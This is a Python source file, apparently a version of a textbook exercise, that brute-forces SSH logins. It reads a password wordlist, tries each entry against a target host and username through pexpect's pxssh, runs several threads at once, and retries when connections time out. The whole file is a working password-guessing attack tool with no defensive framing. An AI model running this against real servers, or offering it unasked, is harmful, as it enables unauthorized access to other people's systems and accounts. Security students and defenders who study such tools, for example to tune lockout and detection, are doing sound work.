# -*- coding: utf-8 -*-
from pexpect import pxssh
import optparse
import time
from threading import *


max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
Found = False
Fails = 0



def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()            # 初始化pxssh对象
        s.login(host, user, password)       # 直接使用login方法连接ssh
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e :
        if 'read_nonblocking' in str(e):        # 若失败 返回字符串中提取信息
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()



def main():
    parser = optparse.OptionParser('usage%prog' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwordFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwordFile = options.passwordFile
    user = options.user
    if host == None or passwordFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passwordFile, 'r')
    for line in fn.readlines():
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print('[-] Testing: ' + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        t.start()
    if Found:
        print('[*] Exiting : Password Found')
        exit(0)
    if Fails > 100:
        print('[-] Too many socket timeouts')
        exit(0)



if __name__ == '__main__':
    main()
